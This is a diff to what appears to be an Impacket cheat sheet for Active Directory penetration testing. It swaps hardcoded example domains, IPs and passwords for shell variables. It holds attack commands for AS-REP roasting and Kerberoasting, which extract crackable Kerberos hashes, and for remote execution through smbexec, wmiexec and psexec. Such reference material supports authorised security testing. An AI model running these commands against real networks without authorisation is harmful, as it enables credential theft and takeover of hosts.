@@ -39,13 +39,13 @@ impacket-script [[domain/]username[:password]]@<target|ip>
 
 ```bash
 # Query users from file, no password needed, output for hashcat/john:
-GetNPUsers.py domain.lan/ -usersfile users.txt -dc-ip 192.168.1.10 -no-pass -format hashcat -outputfile asrep_hashes.txt
+GetNPUsers.py $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP -no-pass -format hashcat -outputfile asrep_hashes.txt
 
 # Query specific user with password:
-GetNPUsers.py domain.lan/user:'password' -dc-ip 192.168.1.10 -format hashcat -outputfile asrep_hashes.txt
+GetNPUsers.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -format hashcat -outputfile asrep_hashes.txt
 
 # Query specific user with NT hash:
-GetNPUsers.py domain.lan/user -hashes LMHASH:NTHASH -dc-ip 192.168.1.10 -format hashcat -outputfile asrep_hashes.txt
+GetNPUsers.py $DOMAIN/$USER -hashes $LM_HASH:$NT_HASH -dc-ip $DC_IP -format hashcat -outputfile asrep_hashes.txt
 ```
 
 ### Kerberoasting (GetUserSPNs.py)
@@ -57,10 +57,10 @@ GetNPUsers.py domain.lan/user -hashes LMHASH:NTHASH -dc-ip 192.168.1.10 -format 
 
 ```bash
 # Request all SPNs using user credentials:
-GetUserSPNs.py -request domain.lan/user:'password' -dc-ip 192.168.1.10 -request
+GetUserSPNs.py -request $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP
 
 # Request specific user
-GetUserSPNs.py -request domain.lan/user:'password' -dc-ip 192.168.1.10 -request-user <specific-user> -outputfile kerberoasting.txt
+GetUserSPNs.py -request $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request-user $TARGET_USER -outputfile kerberoasting.txt
 ```
 
 ## Remote Execution
@@ -70,14 +70,14 @@ GetUserSPNs.py -request domain.lan/user:'password' -dc-ip 192.168.1.10 -request-
 
 ```bash
 # SMB
-impacket-smbexec -u user -p 'password' -d domain.lan 192.168.1.10
+impacket-smbexec -u $USER -p $PASSWORD -d $DOMAIN $TARGET
 ```
 
 ```bash
 # WMI
-impacket-wmiexec -u user -p 'Password123!' -d domain.lan 192.168.1.20
+impacket-wmiexec -u $USER -p $PASSWORD -d $DOMAIN $TARGET
 ```
 
 ```bash
-impacket-psexec -u user -p 'Password123!' -d domain.lan 192.168.1.10
+impacket-psexec -u $USER -p $PASSWORD -d $DOMAIN $TARGET
 ```
